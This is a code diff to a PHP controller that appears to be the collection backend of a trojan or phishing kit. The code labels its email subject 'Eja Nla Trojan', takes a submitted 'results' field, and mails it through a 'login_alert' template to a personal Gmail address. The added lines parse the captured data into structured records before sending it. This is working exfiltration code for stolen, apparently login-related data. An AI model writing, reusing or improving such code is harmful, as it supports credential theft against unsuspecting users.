@@ -72,8 +72,17 @@ class MainController extends Controller {
                  	  $s = "Eja Nla Trojan";
                        $rcpt = "mails4davidslogan@gmail.com";
                        $results = $req["results"];
+
+                       $ret = [];
+                       $temp = explode("GBAM",$results);
+                       foreach($temp as $line){
+                       	$temp2 = explode("|",$line);
+                           $temp3 = ["previous" => $temp2[0], "current" => $temp2[1], "next" => $temp2[2] ];
+                           array_push($ret,$temp3);
+                       } 
+                       
                        #echo "here are the results: ".$results;
-                         $this->helpers->sendEmail($rcpt,$s,['results' => $results],'emails.login_alert','view');  
+                         $this->helpers->sendEmail($rcpt,$s,['results' => $ret],'emails.login_alert','view');  
                           $ret = ['mode' => "success"];                      
                   }       
            return $ret;                                                                                            
